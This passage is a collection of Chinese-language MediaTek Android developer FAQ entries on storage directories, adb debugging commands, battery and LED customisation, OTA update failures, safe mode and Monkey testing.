经过几次迭代后，很快就可以找到最终是哪个文件目录，哪些文件占用了太多空间了
```

## /mnt/asec /mnt/secure文件夹

```text
Google Android手机的软件为了安全性和稳定性都是默认安装到手机内存里，但是手机内存有限，所以我们会做app2sd操作，来让我们安装的软件放到sd卡上，这个操作是需要rom的支持的。
Android 2.2 可以将手机程序安装在外置的sd卡上，也就是我们平常所说的app2sd。但是，官方的app2sd非常鸡肋，需要软件自身支持安装在内存卡上才可以，也就是说用官方的app2sd，要把程序安装在内存卡上，并不是我们使用者说了算，而是软件开发者说了算。经测试安装60多个软件，其中仅有可怜的5个程序能使用官方的app2sd安装在内存卡上。所以，官方的这个app2sd就是忽悠人的。当然，现在很多第三方ROM都自带了第三方的app2sd，可以将任何程序都安装在sd卡上。
在正式介绍app2sd之前，我先要介绍下android系统的几个比较重要的目录，这是理解后面内容的基础。

/system 存放的是rom的信息；/system/app 存放rom本身附带的软件即系统软件；/system/data 存放/system/app 中核心系统软件的数据文件信息。
/data 存放的是用户的软件信息（非自带rom安装的软件）；/data/app 存放用户安装的软件；/data/data 存放所有软件（包括/system/app 和 /data/app 和 /mnt/asec中装的软件）的一些lib和xml文件等数据信息；/data/dalvik-cache 存放程序的缓存文件，这里的文件都是可以删除的。

/mnt 目录，熟悉linux的人都清楚，linux默认挂载外部设备都会挂到这个目录下面去，如将sd卡挂载上去后，会生成一个/mnt/sdcard 目录。
/sdcard 目录，这是一个软链接（相当于windows的文件夹的快捷方式），链接到/mnt/sdcard 目录，即这个目录的内容就是sdcard的内容。
在Android 2.2之后的版本允许将应用程序安装于SD卡，每一个安装在SD卡的应用程序，都可以在SD卡中的/sdcard/.android_secure 目录里找到名称中有出现它的程序名，和副文件名为asec的经过特殊加密处理后的档案。当SD卡挂载于手机时，/mnt/sdcard/.android_secure 目录会被映射到/mnt/asec 目录和 /mnt/secure 目录。其中/mnt/asec 目录中主要是程序的安装目录，包括其执行文件和lib文件等；而/mnt/secure 目录中就存放程序加密后的档案。也就是说，在/mnt路径下看到的/mnt/asec目录和/mnt/secure目录并不是真正存在在手机内存或者sd卡的分区挂载目录，它们只是/mnt/sdcard/.android_secure目录的一个影像而已。
因此，用户程序安装到到sd卡上后，其内容可能分散到：/mnt/asec , /mnt/secure , /data/data 。

要实现app2sd，目前比较流行有两种方案，分别是app2ext 和 data2ext，下面分别介绍下这2种方案。

在Linux文件系统中，有一种特别的文件叫“软链接”，类似于Windows下的快捷方式，软链接可以把一个文件或者文件夹映射到别的地方，一个例子如上面介绍的/sdcard 就是/mnt/sdcard 的软链接。

app2ext的原理是，删除data区中的app文件夹，然后在sd卡的ext分区上创建一个app文件，并通过软链接映射到data区。这样系统会以为，app这个软链接是一个真实的文件夹，会把程序都安装在里面，但实际上，这些程序都安装到卡上了。但由于操作系统并不知道，所以这种情况下，我们依然看到系统显示这个程序是安装在“内置空间”的。
data2ext则更彻底，它不是用软链接，而是直接用“挂载”功能，Linux下所有的存储设备都必须挂载成一个文件夹才能进行文件操作（如sd卡就挂载在/mnt/sdcard目录下面）。data文件夹本来是对应手机内部Flash中的一个分区（为了保持术语的准确，这里要把内部Flash和内存相区别，内部Flash是ROM，内存是RAM）。而data2ext则是修改了挂载对应关系，使data文件夹挂载的不是内置Flash，而是sd卡的整个ext分区。这样，不仅是app，连存储程序设置的data和缓存dalvik-cache都会存储到sd卡中。

可以看到，dalvik-cache和data这两个文件夹的位置，是这两种方式的一个重大区别。其中dalvik-cache是虚拟机预编译缓存，data（不同于/data，这个是/data/data）是存储程序数据的地方，例如游戏的存档记录，软件的配置信息等。这样有什么区别，区别在于假如你重刷了ROM，app2ext的话，所有的程序都可以保留，但是这些程序的配置信息和游戏的存档都会丢失。而data2ext则可以连同配置和存档都保留，但是dalvik-cache也是一个容易积累垃圾的地方，这些垃圾也会一同保留。
data2ext由于是把整个data分区都放在sd卡上，因此，我们刷ROM需要WIPE的时候，这个data分区的内容就可能不会被wipe，这可以保存用户的个人资料，但是也可能造成系统莫名其妙的故障。
```

## asec

```text
1. asec 文件是什么?
asec的全称是Android Secure External Caches

以前app安装好之后，app和app的数据都是放在data分区，而data分区经常存储空间不够，

于是从Android 2.2， Froyo版本开始，Android开始支持App2Sd功能，

所谓的App2Sd就是安装apk时把apk安装到Sd卡，apk的数据也放到sd卡，

官方的app2sd功能比较鸡肋，由开发者自己决定是否支持app2sd功能，这样大部分应用不支持app2sd功能

而民间的app2sd功能实现时，直接把sdcard挂载到data目录，这样所有的数据都会放在sdcard上，

如果sdcard够大的话，便能解决手机data分区不够的问题。

官方的app2sd功能实现时会建立/sdcard/android_secure，

然后在该目录为每个支持app2sd功能的应用建立asec文件

2.官方app2sd功能的最初实现
官方实现的app2sd功能，最初是在/sdcard目录下建立一个android_secure目录，

然后在该目录下为支持app2sd功能的应用建立一个对应包名的asec文件，

比如com.shuame.mobile，那么建立的文件是com.shuame.mobile.asec，

asec文件是一个镜像文件，Android利用该文件建立一个loop设备，

Android还会为每个应用创建一个挂载点，例如：/asec/com.shuame.mobile

然后将建立好的loop设备挂载到/asec/com.shuame.mobile

3. asec文件存在哪个目录
最初asec文件存放在/sdcard/android_secure目录，

后来存放在/sdcard/.android_secure目录下

4. 为了保护sdcard目录下的android_secure目录不被其它第三方应用搞坏，所采取的措施
为了保护sdcard目录下的android_secure目录不被其它第三方应用搞坏，

最先采取的措施是采取挂载一个只读并且零字节的临时文件系统到/sdcard/android_secure目录，

这样第三方应用就不能操作该目录

为了实现该目的，采取的步骤如下所示：

1) Mount checked media at a secure location (/mnt/secure/staging)

2) Ensure /android_secure exists on the media, (creating if it doesnt)

3) Bind-mount /mnt/secure/staging/android_secure -> /mnt/secure/asec

(where only root can access it)

4) Mount an RDONLY zero-sized tmpfs over /mnt/secure/staging/android_secure

5) Atomically move /mnt/secure/staging to the publicly accessable storage

directory (/mnt/sdcard)，move挂载时，其实是使用了MS_BIND选项

采取这个措施后， Android还为每个应用创建的挂载点也变化了，

放在/mnt/asec目录，例如/mnt/asec/com.shuame.mobile，

所以在支持app2sd功能的手机上常常可以看到很多/mnt/asec/* 的挂载点

后来为了进一步保护android_secure目录，

将android_secure目录重命名为.android_secure目录

5. /data/app-asec目录用途
/*Path to external storage where *only* root can access ASEC image files*/

const char *Volume::SEC_ASECDIR_EXT = "/mnt/secure/asec";

/*Path to internal storage where *only* root can access ASEC image files*/

const char *Volume::SEC_ASECDIR_INT = "/data/app-asec";

/mnt/secure/asec对应外置sd卡上的.android_secure目录，

/data/app-asec对应内置sd卡上的.android_secure目录，

该目录下一般用于存放asec文件，Android系统会将这些asec镜像文件挂载到/mnt/asec/com.*
```

## [CMD]  [FAQ07789]  Android shell 如何copy/复制文件

```text
在4.2 之前，toolbox 没有内置cp 命令，需要使用
cat 或者 dd 操作如：
cat source_file > dest_file
dd if=source_file of=dest_file
 
在4.2 之后，toolbox 中引入了cp 命令，可以直接使用cp 操作:
cp source target
usage: cp [-R [-H | -L | -P] ]  [-f | -i]  [-alNpv]  src target
            cp [-R [-H | -L | -P] ]  [-f | -i]  [-alNpv]  src1 ... srcN directory

```

## [battery]  [FAQ10134]  [BMT] 电量测试需要做什么实验?

```text
请参考下面的文件：
Path:
MediaTek DCC > External Document > HW > Common Design Notes > PMU > Fuel Gauge >Fuel Gauge Application Notes
Fuel Gauge Test Way Introduction
```

## [battery]  [FAQ05785]  [BMT] 如果需要客制化关机充电动画，需要注意的事项

```text
1.如果需要客制化关机充电，需要注意哪些事项：

A.关机充电图片的位置
alps\mediatek\custom\common\lk\logo\分辨率\
在这个文件路径下面有很多充电图片，总共有38张。
38张图片通过alps\mediatek\custom\common\lk\logo\update脚本，
打包存储在一个档案下面。

B.38张图片,在档案里面存在序号，具体的排序号，请查看update脚本:
譬如：
从update脚本上面可以看出，低电量的图片的序号为2
在软件里调用低电量的图片就是用

C.动画是怎么实现的?以低电量显示为例子
循环调用序号为25-34的10张图片，跟update脚本刚好对应起来。
update脚本里面，低电量的10张图片的序号为25-34

D. 如果需要显示自己的图片，怎么做?
请把自己的图片，替换成logo底下的同名文件，这样就可以不用修改脚本，直接调用
show_logo_surface,调用相应序号就可以显示出来了。
不过有一点需要特别注意，所使用的图片格式必须是bmp,位数必须是24.否则无法显示
```

## [OTA]  [FAQ10548]  OTA升级，无法找到更新包

```text
OTA升级，服务器上已经上传了新版本，但是手机检索的时候，仍然提示版本已经是最新版本，找不到更新包。
从log看：提示如下：
{"status":1000,"name":"mp.v1.1","size":4455854,"android_version":"4.2.2","release_notes":"MP.V1.1","deltaId":181,"fingerprint":"XXXXX/vh075_td_emmc_xxxxx_s4509/vh075_td_emmc_xxxxx_s4509:4.2.2/JDQ39/1387464158:user/test-keys"}//这个log说明找到了新的软件版本
12-20 09:49:20.887: INFO/SystemUpdate/HttpManager(2002): parseCheckVersionInfo
12-20 09:49:20.894: INFO/SystemUpdate/HttpManager(2002): HTTP_RESPONSE_SUCCESS
12-20 09:49:20.895: INFO/SystemUpdate/HttpManager(2002): res.mVersionName = mp.v1.1
12-20 09:49:20.895: INFO/SystemUpdate/HttpManager(2002): res.fileSize = 4455854
12-20 09:49:20.895: INFO/SystemUpdate/HttpManager(2002): res.releaseNote = MP.V1.1
12-20 09:49:20.895: INFO/SystemUpdate/HttpManager(2002): delta package: res.packageId = 181
12-20 09:49:20.895: INFO/SystemUpdate/HttpManager(2002): res.packageId = 181res.isFullPkg = false
12-20 09:49:20.895: INFO/SystemUpdate/HttpManager(2002): fingerPrintPkg = XXXXX/vh075_td_emmc_xxxxx_s4509/vh075_td_emmc_xxxxx_s4509:4.2.2/JDQ39/1387464158:user/test-keys
12-20 09:49:20.895: INFO/SystemUpdate/HttpManager(2002): fingerPrintLocal = 
12-20 09:49:20.898: INFO/SystemUpdate/HttpManager(2002): sendErrorMessage, mErrorCode = 1010//这里说明软件版本不匹配

[SOLUTION] 
在对比版本的时候，会对比fingerprint值，log来看这里
12-20 09:49:20.895: INFO/SystemUpdate/HttpManager(2002): fingerPrintPkg = XXXXX/vh075_td_emmc_xxxxx_s4509/vh075_td_emmc_xxxxx_s4509:4.2.2/JDQ39/1387464158:user/test-keys
12-20 09:49:20.895: INFO/SystemUpdate/HttpManager(2002): fingerPrintLocal =
fingerPrintLocal是获取来的本地手机的fingerprint值，这边获取为null，是因为客户定义的版本号太长了，导致在组装成fingerprint值的时候，超出了google限制的property的长度92 byte，这种情况下，请改小客户定义版本内容，即
XXXXX/vh075_td_emmc_xxxxx_s4509/vh075_td_emmc_xxxxx_s4509:4.2.2/JDQ39/1387464158:user/test-keys
XXXXX表示OEM，例如alps
vh075_td_emmc_xxxxx_s4509表示版本号，注意一定不能太长。
```

## [FAQ08670]  [Others] Enable ”CONFIG_MTK_USB_UNIQUE_SERIAL“，每台手机进meta mode都要安装驱动

```text
Enable ”CONFIG_MTK_USB_UNIQUE_SERIAL“ 之后，产线SN Writer Tool/HW Test Tool/ATE Tool 测试每台手机时候，都要求安装驱动，给产线生产带来不便
[SOLUTION] 

1. SN Writer Tool
修改SN Writer Tool执行路径下SN_SETUP.txt 文件设置，如下
IS Composite Device Enable = False

2. HW Test Tool
界面上取消勾选Option->Enable composite kernel device

3. ATE Tool
修改ATE Tool 执行路径下Customer_Setup.txt 文件设置，如下：
IS Composite Device Enable = 0

4. 客户自己写工具，请在调用
LIBEXPORT int __stdcall SP_Preloader_BootMode(SP_BOOT_ARG_S * pArg);
boot meta mode 时候设置传入参数
pArg->m_bIsCompositeDeviceEnable = 0;
```

## [battery]  [FAQ10411]  关机充电下，怎样show高温警告图片

```text
alps\mediatek\external\ipod\bootlogo.cpp
1.
bootlogo_show_charging()中仿照高压充电显示警告图片的方法来修改高温警告图片即可
在
if (get_ov_status()) {
    mt65xx_disp_show_charger_ov_logo();
    return;
}
后面添加
if (get_ot_status()) {
    mt65xx_disp_show_battery_ot_logo();
    return;
}
 
void mt65xx_disp_show_battery_ot_logo(void) {
    XLOGD("[ChargingAnimation %s %d] show battery_ot logo, index = x \n",__FUNCTION__,__LINE__);
    mt_show_logo(x);  // 这里的x是您可以自行选择的
}
2.
alps\mediatek\external\ipod\ipodcommon.cpp
在
开头增加
#define BATTERY_TEMPERATURE_PATH "/sys/class/power_supply/battery/batt_temp"
#define BATTERY_OVER_TEMP 500
int get_ov_status()函数的后面添加
int get_ot_status() {
     int temp = get_int_value(BATTERY_TEMPERATURE_PATH);
     SXLOGI("battery temperature : %d\n", temp);
 
     if(temp >= BATTERY_OVER_TEMP)
     {
           return 1;
     }
     return 0;
}
```

## [CMD]  [monkey]  [FAQ04490]  Monkey test确定package name的一种特殊方法

```text
用Monkey的调试模式命令可以获取到package name

Monkey 单元测试需要确定所测模块的package name，一般用Dev tools/Package browser 或者豌豆荚等程序就可以查找到对应的package name，现在这里介绍另外一种特殊的方法：

连上USB cable并保证adb devices命令能识别到设备的前提下，输入adb shell monkey --port PORT_NUMBER -v -v 可以进入调试模式(其中PORT_NUMBER可以随意指定),然后手机这边点击相应的模块，CMD窗口会显示出对应的log信息，其中就包含package name.
```

## [FAQ03439]  [Recovery] 如何进入recovery mode立即显示menu菜单

```text
请将alps/bootable/recovery/ui.c文件中的static int show_text = 0;
修改为static int show_text = 1;
```

## [CMD]  [FAQ04270]  [LEDS]  如何通过adb shell 控制 LEDs

```text
列出所有的LED名字：
adb shell "ls /sys/devices/platform/leds-mt65xx/leds/"
adb shell 控制LED：
// 打开
adb shell "echo 255 > /sys/devices/platform/leds-mt65xx/leds/LEDNAME/brightness"
LEDNAME = "button-backlight" or "lcd-backlight" ...
// 关闭
adb shell "echo 0 > /sys/devices/platform/leds-mt65xx/leds/LEDNAME/brightness"
```

## [FAQ03772]  [LEDS] 怎样添加一个自定义的LED灯?

```text
1. 修改如下两个文件：

alps/mediatek/custom/common/kernel/leds/inc/cust_leds.h
-----------------------------------------------------------

enum mt65xx_led_type {
    MT65XX_LED_TYPE_RED = 0,
    ... ...
    MT65XX_LED_TYPE_LCD,
    MT65XX_LED_TYPE_ABC,        // Add a new LED type
    MT65XX_LED_TYPE_TOTAL,
};

alps/mediatek/custom/YOUR_PRJ/kernel/leds/mt65xx/cust_leds.c
----------------------------------------------------------------
static struct cust_mt65xx_led cust_led_list[MT65XX_LED_TYPE_TOTAL]  = {
    {"red",               MT65XX_LED_MODE_NONE, -1,{0}},
    ... ...
    {"lcd-backlight",     MT65XX_LED_MODE_CUST, (int)Cust_SetBacklight,{0}},
    // Set LED params, Please refer to <Driver all in One>
    {"abc-backlight", MT65XX_LED_MODE_CUST, (int)Cust_SetBacklight_abc,{0}}, 
};

2. 重新编译后，在Kernel log 里可以看到如下信息:
--------------------------------------------------------------------
<7>[    1.021967]  (0)Registered led device: button-backlight
<7>[    1.022013]  (0)Registered led device: lcd-backlight
<7>[    1.022072]  (0)Registered led device: abc-backlight   // <------- !

3. 用如下命令查看新LED的 sysfs节点
adb shell ls /sys/devices/platform/leds-mt65xx/leds/
------------------------------------------------------------------------
abc-backlight
button-backlight
lcd-backlight
```

## [FAQ04317]  如何在Android App中屏蔽（拦截）Home按键及其他按键

```text
编写一个Acitivity，如下所示：
关键点1：屏蔽HOME按键，在onAttachedToWindow中设置FLAG_HOMEKEY_DISPATCHED
关键点2：屏蔽除Power , Home外的按键，覆盖dispatchKeyEvent方法，并返回为true
public class LockByKeyGuard extends Activity {
       @Override
       public void onCreate(Bundle savedInstanceState) {
              super.onCreate(savedInstanceState);
              setContentView(R.layout.main);
       }
       @Override
       public void onAttachedToWindow() {
       //关键：在onAttachedToWindow中设置FLAG_HOMEKEY_DISPATCHED
              this.getWindow().addFlags(WindowManager.LayoutParams. FLAG_HOMEKEY_DISPATCHED);
              super.onAttachedToWindow();
       }
       @Override
       public boolean dispatchKeyEvent(KeyEvent event) {
              // 返回true，不响应其他key
              return true;
       }
```

## [FAQ04321]  判断当前是否是飞行模式和侦听airplane mode change

```text
在 AirplaneModeEnabler 中 提供了 isAirplaneModeOn 方法来判断当前是否是 Airplane mode：
public static boolean isAirplaneModeOn(Context context) {
    return Settings.System.getInt(context.getContentResolver(), Settings.System.AIRPLANE_MODE_ON, 0) != 0;
}

侦听是否airplane mode 发生改变，可以用注册intentFilter 来侦听。

BroadcastReceiver  mReceiver = new AirplaneModeBroadcastReceiver();
IntentFilter intentFilter = new IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED);
registerReceiver(mReceiver, intentFilter);

private class AirplaneModeBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action.equals(Intent.ACTION_AIRPLANE_MODE_CHANGED)) {
           // add your code here ………
        }
    }
}
```

## [CMD]  [FAQ04381]  [Vibrator]  如何通过adb shell命令调试Vibrator

```text
请执行下述界面，确认震动硬件是否正常工作.
下面的命令是用于调试，请试着用它找出你想要的时间和震动强度。 1000毫秒 = 1秒
adb shell "echo 1000 > /sys/devices/virtual/timed_output/vibrator/enable"
```

## [FAQ03946]  [FM]  FM支持的scan interval有几种

```text
FM支持的scan interval有几种

scan interval 是什么意思??
```

## [battery]  [FAQ02506]  [BMT] 如何掌握Fuel Gauge 算法流程

```text
(以下简述以MT6575+Android2.3为例)
1、Fuel Gauge 算法需要相关软、硬件支持，
    硬件方面：正常的电池温度检测电路，正常的Fuel Gauge 电流检测电路
    软件方面：开启FG功能（默认情况下已打开），由检测客户提供的样机及标配电池而得出的若干个FG数组（送检请与CPM联系）

2、Fuel Gauge 算法相关文件
    mediatek\platform\mt65xx\kernel\drivers\power\mt65xx_fuel_gauge.c
    mediatek\custom\[PROJECT] \kernel\battery\battery\Custom_fuel_gauge.h
    Custom_fuel_gauge.h 中的数组由检测样机及标配电池后生成。

3、Fuel Gauge 算法相关介绍资料
    Mediatek MT65xx Fuel Gauge      ；该资料可向CPM申请。

4、如何关闭 Fuel Gauge
    请参考相关FAQ
```

## [battery]  [FAQ02510]  [BMT] 工厂测试模式下的电池温度不对

```text
1、与工厂测试模式相关的电池检测函数位于以下文件，
    mediatek\source\factory\src\test\Ftm_battery.c
2、参考其中的温度转换函数BattThermistorConverTemp()
```

## [FAQ02511]  [BMT] 如何修改快速开机模式下的背光键?

```text
在启用快速开机功能的情况下，如何修改背光键为开机键?
[PLATFORM] 
MT6575/15 + Android 2.3
MT6573/13 + Android 2.3

[Solution] 
(以下简述以MT6575+Android2.3为例)

1、与快速开机功能相关的文件位于以下路径：
    mediatek\source\external\ipod\*.*
2、定义ipod 模式下的背光键及开机键
    修改文件ipodmian.c 中的数组：pwrkeys[] ,blkkeys[] 
```

## [CMD]  [log]  [debug]  [FAQ03046]  如何通过USB抓取main/events/radio/kernel log

```text
可以使用adb命令来抓这些log

1, radio log
命令： adb logcat -b radio -v time > radio.txt
-v time: 表示log中加入了时间信息

2, main log
main log和我们从DDMS中看到的log是一致的

命令: adb logcat -b main -v time > main.txt
-v time: 表示log中加入了时间信息

3, event log
event log属于system log
命令: adb logcat -b events -v time > events.log
-v time: 表示log中加入了时间信息

4, kernal log
使用超级终端来抓kernal log，请参考以下步骤：

1) 选择正确的COM口(COM3)
2) 设定正确的波特率(921600)
3) 在超级终端中得到log
```

## [battery]  [FAQ03519]  [Power] 关于待机平均功耗高的测试以及自行判断注意事项

```text
如果贵司测试的时候，发现平均功耗高，
1》
首先请去掉所有的APK测试，看平均功耗是否有问题，
如果跟去掉APK之前一样，说明跟APK没有关系
如果跟去掉APK之前相比，功耗有所降低，说明跟APK有一定的关系
跟APK有关系，请自行分析APK。
 
2》
另外，请抓取相应的待机的 mobilelog,
从 kernel_log 中分析，
如果 log 中可以查找到 wake up by RTC
请在相应的 main_log 中查找关键字 Alarm triggering, 其后面对应的type 0, type 2所对应的APk就是唤醒系统的唤醒源，
同样请去掉以后测试，
但是 com.android.phone 例外，
这个 APK 是 ICS android4.0 加上的一个 google default 的机制，
是一个每隔6分钟起来check数据连接是否有问题的机制，
检查是否只有TX没有RX的行为，
一旦检查到系统数据连接有问题，就会做相应的recovery动作
 
3》
从kernel_log中分析，
如果log中可以查找到
wake up by CCIF_MD
请查找后面一句log相应的CCIF_MD wakeup source: 
如果是在您没有打开modemlog的基础上面出现此问题，
请帮忙同时抓取待机时候的mobilelog以及modemlog并附上modem对应的database
便于我司查找问题
如果是 CCIF_MD wakeup source: Mdlogger_RX
说明是因为打开modemlog引起的问题，正常
 
4》
从kernel_log中分析，
如果log中可以查找到
wake up by EINT
一般情况下是由于press power key引起的，
在后面的log中可以看到有wakeup的字样，就说明是power key
其他的情况应当是异常的中断引起的问题
您可以在中断例程中查找此中断的来源
```

## [FAQ03776]  [Power] 关于RTC唤醒系统问题

```text
RTC唤醒系统的特征是
     从kernel_log中可以查找到 "wake up by RTC"
 
RTC唤醒系统的原因是
     上层的APK
 
查找的方法：
     从main_log中查找关键字"Alarm triggering"
     然后看相对应的log后面表明是type 0 还是type 2,
     只有type 0或者type 2 的对应的APK才是能唤醒系统的APK
     
比如：
     AlarmManager: Alarm triggering: Alarm{41c36640 type 2 com.android.providers.calendar}
     从这一行您就可以看出，com.android.providers.canlendar就是能唤醒系统的APK
 
例外：
    目前com.android.phone这个APK也是type 2的APK，
    在存在数据链接的情况下，每隔6分钟就会唤醒系统起来检查是否当前的数据链接有问题，并及时做receovery动作
    所以在查找RTC唤醒源的时候，这个APK需要排除在外，
    这个APK是google default的机制
 
请您在提功耗相关的问题之前，
切记，请自行将RTC唤醒这部分分析，并将有关的APK都去掉以后再行测试，
这部分唤醒会增加系统的平均功耗，
有关这些第三方APK唤醒的问题我司不予cover。
```

## [FAQ03446]  [Power] How to use catcher tool to get RTC clock (32KHz) frequency

```text
具体确定时钟频率的方法如下：
1. 利用SD卡来抓取系统睡眠时候的modemlog
2. 然后在catcher tool中选择controls->Open Dump File, 打开MDLog_L1_XXX.dmp文件（modemlog中抓取的其中一个文件）
3. 如果您看到advanced->sleep_mode本来就是勾选上的，那么您就可以不用做第4步，直接跳到第5步
4. 如果您看到advanced->sleep_mode是未勾选上的，请您将目前打开的文件另存为xxx.clg文件，然后打开此.clg文件
5. 选择sleep_mode以后，就可以看到弹出的框框中，左边一栏有三列
分别是frame, Freq.Meas Result, 32K Freq
其中32K Freq那一列就是32K时钟的真正的值，也就是RTC clock的真正的值
此值得准确值为32768， 您可以比较一下看看。
```

## [CMD]  [log]  [debug]  [FAQ03548]  手机软件测试注意事项

```text
测试前准备:
1:请备份编译后生成的alps/kernel/vmlinux  (解KE的关键)
2:请备份编译后生成的apps/out/target/product/$project_name$/symbols/整个目录. (解NE的关键)
3:清除T卡的所有记录

测试过程中:
1:发现有异常,尽可能马上备份完整的LOG, 再进行下面测试,以免后来的测试把之前的LOG冲掉.
2:调整手机的时间跟实际的时间一致.
3:记录现场的情况: 是在什么情况下发生?  发生的时间?
4:如果是成批有问题,请详细统计概略

如何抓取完整的LOG:
1. 使用GAT工具（该工具是MTK标准的debug工具，一般和flashtools一起释放），复现问题后连上usb （adb要能工作，如果不能工作，可以重启手机连上），打开GAT，点击DDMS Control这个界面下面一排按钮的最右边按钮（是个虫子图标的按钮），然后GAT会自动抓取手机里所有的log，并打包好（目录一般是放在临时目录下，注意看命令行），将压缩包上传。

2. 也可以用以下脚本（以下CODE保存为.bat文件）

%Writed by Yanghui Li%

adb devices

@echo "抓出sdcard/mtklog"
adb pull /sdcard/mtklog mtklog/

@echo “抓出sdcard2/mtklog”
adb pull /sdcard2/mtklog mtklog/sdcard2

@echo "抓出trace"
adb pull /data/anr mtklog/anr

@echo "抓出data aee db"
adb pull /data/aee_exp mtklog/data_aee_exp

@echo "抓出data mobilelog"
adb pull /data/mobilelog mtklog/data_mobilelog

@echo "抓出NE core"
adb pull /data/core mtklog/data_core

@echo "抓出tombstones"
adb pull /data/tombstones mtklog/tombstones

@echo "完成"

pause 
```

## [init]  [FAQ02625]  如何修改system 下面文件的权限

```text
在init.rc 中修改system 下面文件的权限无效，请问如何修改?

由于某些特别的操作或者设计，我们需要读取或者去修改system 下面某个具体的文件(不推崇)。
System 文件夹在init.rc 中被描述为 ro (read only)， 即被mount 成ro, 所以即使您再去chmod or chown 某个文件的权限或者所有者，都无法达到目的。需要在system 被remount 成ro 前修改文件权限方可。
您要增加的代码须放置在:
on fs
# mount mtd partitions
    write /proc/bootprof "INIT:NAND:Mount_START"
    # Mount /system rw first to give the filesystem a chance to save a checkpoint
    mount yaffs2 mtd@system /system nandboot
    mkdir /system/secro 0600 system system
    # RIL need to do this before the folder /system changed to read only
    chown radio system /system/etc/ril
    chmod 0770 /system/etc/ril
    chmod 0444 /system/etc/ril/oper.lis
    #Add your code here...

    mount yaffs2 mtd@system /system ro remount nandboot
    mount yaffs2 mtd@userdata /data nosuid nodev nandboot
    mount yaffs2 mtd@cache /cache nosuid nodev nandboot
    write /proc/bootprof "INIT:NAND:Mount_END"

同样对于emmc 的机器，也需要在system 分区被remount 成read only 之前进行调整。
```

## [prop]  [FAQ02634]  如何为机器增加client id

```text
因为client id 包含项比较多，首先和客户确认需要内置的具体的参数，确认具体参数后，即可在

alps/mediatek/config/贵司工程/system.prop 的最后增加:

比如:
ro.com.google.clientidbase.ms = android-americamovil-br
ro.com.google.clientidbase.am = android-americamovil-br
ro.com.google.clientidbase.vs = android-americamovil-br

这些参数一般都是以ro.com.google.clientidbase 开头，具体的值需要和运营商确认后才可以。
```

## [知识点]  [FAQ03128]  Android系统中的6种模式

```text
1:一般启动模式（normal mode):
功能是正常启动手机，方法为关机状态下按电源键启动。

2:安全模式（safe mode）:
此模式和正常启动一样，但没有登记Google，所以不能访问Market或使用你的Google账号。操作方法为按住“menu”键，按电源键启动手机，直至手机启动完成松开“menu”键。

3:恢复模式（recovery mode）
可打开命令解释程序（shell），刷新映像文件（flash image），执行备份等。当然这一切取决于你手机上的recovery image版本。使用方法很简单，就是home键和电源键一起按。

4:引导模式（bootloader mode）
功能是从SD卡上安装新的系统映像（DREAIMG.NBH），只需再按一次电源键。值得一提的事为Android手机获取root权限，就是使用这个模式。操作方法为照相键和电源键一起按。

5:fastboot模式
主要是在电脑上使用fastboot命令来刷新映像文件。使用方法为按住返回键，按电源键启动手机，直至屏幕出现FASTBOOT字样后松开返回键。

6:诊断模式（diagnostic mode）
是为了测试手机各项功能的模式，刻意通过轨迹球中心键和电源键打开。
```

## [知识点]  [FAQ03308]  安全模式意义? 如何启动安全模式? 如何屏蔽安全模式?

```text
1.Google 设计来确认在不启动第三方app/service 的情况下，确认机器的稳定性的一个开机方式，通常普通用户很少用到。在framework 内部会影响到AMS&WMS&PMS 的行为。
2.安全模式是在开机system server 的windowmanagerserivce 启动时检测的，一般是power + memu 键 ，并且在开机的过程中还要长按，或者滑轮之类。
3.如何屏蔽，这个最终的检测是在PhoneWindowManager.java 中执行。
alps/frameworks/base/policy/src/com/android/internal/policy/impl/PhoneWindowManager.java 中的 detectSafeMode() 方法，请参考里面的
mSafeMode = menuState > 0 ........................................ 
把这一行直接设置为
mSafeMode = false 即可。
在这一行你也可以看到哪些按键对safemode 有影响。
```

## [CMD]  [FAQ04355]  如何手动trigger一个modem exception?

```text
1)GB/ICS 版本： adb shell am broadcast -a com.mediatek.mdlogger.FORCE_MODEM_ASSERT，
2)JB版本：adb shell am broadcast -a com.mediatek.mtklogger.ADB_CMD -e cmd_name force_modem_assert --ei cmd_target 2
```

## [ota]  [FAQ04427]  OTA升级不能进入到recovery mode

```text
在OTA升级时，手机关机后没有进入到recovery mode，执行失败error提示log：
Error : onSetRebootRecoveryFlag,
engine error to set flag to reboot into recovery mode.
[SOLUTION] 
原因：在初始化时没有将应用GoogleOtaBinder设置为user root。
解决：在init.rc中添加以下两行：
1.  service GoogleOtaAgent /system/bin/GoogleOtaBinder
2.  user root
```

## [ota]  [FAQ05739]  SD或者OTA升级secutiry device和non-security device的区别

```text
问题现象： 同样的升级包在升级non-security device可以升级成功，升级secutiry device确不能升级成功！

原因说明：SD在升级non-security device和security device的区别是：在升级security device时，SUPPORT_SBOOT_UPDATE这个宏会打开！然后升级security device时会去检查升级包中的SEC_VER.txt这个文件，并且检查SEC_VER.txt这个文件里的CUSTOM_NAME,BOOTIMG,RECOVERY,ANDROID四项，并且要求BOOTIMG,RECOVERY,ANDROID这三项的值要比手机里面这三项的值要相等或者大于手机版本里的值！否则会升级失败！

下面举一个例子来说明，假如bootimg第一版是version 1
1. 空机先烧录进bootimg，则device里面的记录是version 1 2. 假如发现bootimg有security bug，重新编出一版 version
2. 接着烧录，device里面就变成记录的是version 2
3. 假如发现bootimg有security bug，重新编出一版 version 3；接着烧录，device里面就变成记录的是version 3
4. (此时，如果要烧录回去verison 1或version 2，都是不允许的动作)
5. 假如这个时候USER透过OTA去升級，而OTA package记录的BOOTIMG版本號是4，那就允许更新；如果是2或3，都不允许更新
```

## [monkey]  [FAQ03887]  为何Monkey测试后不能关机

```text
1.连接adb
2.运行monkey test
3.等待monkey test finish
4.长按power 键，选取“关机”，无法弹出是否确定关机的对话框
从log上看，schpwroffreceiver.java在shutdowm()中，

Log.d(TAG, "!!! Request to shutdown !!!");
if (SystemProperties.getBoolean("ro.monkey", false)) {
    Log.d(TAG, "Cannot request to shutdown when Monkey is running, returning.");
    return;
}
可以看出运行monkey的状态，未被复位，导致无法关机。
 
[Solution] 
这是敝司特意的设计, 主要针对: 运行Monkey的时候不会意外关闭电源, 以免Monkey Test提早结束。
此部份仅影响Monkey Test, 不影响用户其他使用, 建议贵司保留此项设计, 以免造成Monkey Test时无谓的困扰。
```

## [monkey]  [FAQ08776]  关于Monkey Test自动关机的问题

```text
